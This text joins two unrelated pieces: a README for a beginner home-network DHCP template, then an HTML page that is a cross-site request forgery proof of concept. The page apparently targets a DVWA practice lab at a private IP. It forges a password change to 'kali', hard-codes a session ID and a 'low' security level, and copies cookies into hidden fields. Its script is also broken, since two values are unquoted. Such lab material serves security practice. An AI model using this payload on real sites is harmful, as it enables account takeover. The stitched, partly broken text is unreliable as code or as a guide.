Simple-Network-Configuration
Overview
This project provides a basic template for setting up a simple home network configuration, focusing on dynamic IP address allocation via DHCP. It demonstrates the fundamental steps involved in configuring a small home network, automating IP assignment and basic routing. The repository is ideal for beginners who want to set up and manage a home network with minimal manual configuration.

Features
Home Network Setup: Configure a simple home network for devices such as PCs, laptops, and smart devices.
DHCP Configuration: Automate IP address allocation for home devices using DHCP, minimizing the need for manual IP setup.
Basic Routing: Establish basic routing between devices for local communication.
Network Topology
The simple home network topology configured by this project includes:

A router with DHCP enabled.
Multiple end devices (e.g., laptops, PCs, or smart devices).
Installation
Clone the repository:

bash
Copy code
git clone (https://github.com/vishal-rathod-1/Simple-Network-Configuration.git)
cd simple-network-configuration
For Linux, ensure the system is set to use DHCP:

bash
Copy code
sudo netplan apply
For Windows, configure DHCP from the network settings panel.

Contributing
Feel free to submit issues and pull requests to enhance the project. Contributions for additional platform support and more robust configurations are welcome!

License
This project is licensed under the MIT License. See the LICENSE file for more details.


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Change Form</title>
   <script>
        // This function sets the CSRF token from the cookie to the hidden input field
        window.onload = function() {
            // Get CSRF token from cookies
            var csrfToken = getCookie('csrf_token'); // Assuming your CSRF token is stored as 'csrf_token'
            var sessionID = getCookie('PHPSESSID'); // Get session ID from cookie
            var securityLevel = getCookie('security'); // Get security level from cookie
            
            // Set the CSRF token in the hidden input field
            document.getElementById('csrf_token').value = csrfToken;
            document.getElementById('PHPSESSID').value =  s247v4jvr16uekkch2estn1823;
 // If needed, store session ID in a hidden input
            document.getElementById('security').value = low; // If needed, store security level in a hidden input
        };

        // Helper function to get the value of a cookie by its name
        function getCookie(name) {
            var value = "; " + document.cookie;
            var parts = value.split("; " + name + "=");
            if (parts.length == 2) return parts.pop().split(";").shift();
            return "";  // Return empty string if cookie not found
        }
  </script>
</head>
<body>

    <h1>Change Your Password</h1>

    <!-- Password Change Form -->
    <form action="http://10.10.69.120/vulnerabilities/csrf/?password_new=kali&password_conf=kali&Change=Change#" method="POST">
        <label for="password_new">New password:</label><br />
        <input type="password" name="password_new" id="password_new" autocomplete="off" required><br /><br />

        <label for="password_conf">Confirm new password:</label><br />
        <input type="password" name="password_conf" id="password_conf" autocomplete="off" required><br /><br />

        <!-- Hidden input to pass CSRF Token -->
        <input type="hidden" id="csrf_token" name="csrf_token" value="">
        
        <!-- Hidden inputs for session ID and security level (optional, depending on your needs) -->
        <input type="hidden" id="PHPSESSID" name="PHPSESSID" value="">
        <input type="hidden" id="security" name="security" value="low">

        <br />
        <input type="submit" value="Change Password" name="Change">
    </form>

</body>
</html>
